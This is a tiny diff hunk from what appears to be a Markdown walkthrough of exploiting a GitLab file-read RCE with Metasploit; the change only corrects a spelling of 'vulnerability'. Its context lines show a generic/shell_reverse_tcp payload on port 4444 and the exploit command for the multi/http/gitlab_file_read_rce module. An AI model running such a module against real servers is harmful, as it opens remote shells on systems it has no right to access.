@@ -78,7 +78,7 @@ Payload options (generic/shell_reverse_tcp):
    LPORT  4444             yes       The listen port
 ```
 
-Exploitation RCE vulnersability: 
+Exploitation RCE vulnerability: 
 
 ```
 msf6 exploit(multi/http/gitlab_file_read_rce) > exploit 
